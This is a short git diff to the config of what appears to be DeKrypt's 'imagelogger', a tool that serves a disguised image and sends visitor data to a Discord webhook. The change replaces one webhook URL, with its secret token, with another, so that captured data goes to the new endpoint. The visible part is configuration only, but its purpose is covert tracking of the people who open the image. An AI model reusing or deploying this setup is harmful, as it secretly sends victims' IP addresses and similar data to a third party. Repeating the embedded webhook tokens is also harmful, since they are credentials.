@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1521218658318417950/oBwFWsxna5PI24DEQ_EdNBzB9YlgAd_ZpF0tMpg1V6K-RO4n1vj8ZEdtajU3YcuDISsU",
+    "webhook": "https://discord.com/api/webhooks/1521236952890736641/rNdiZh7Cogr_aOm4fD5rXtVcOMO5oray5HeSTNLYLU9-zoehwu-VTnpit8q32Zazcvr7",
     "image": "https://www.pngmart.com/files/11/Trollface-Girl-Transparent-Background.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
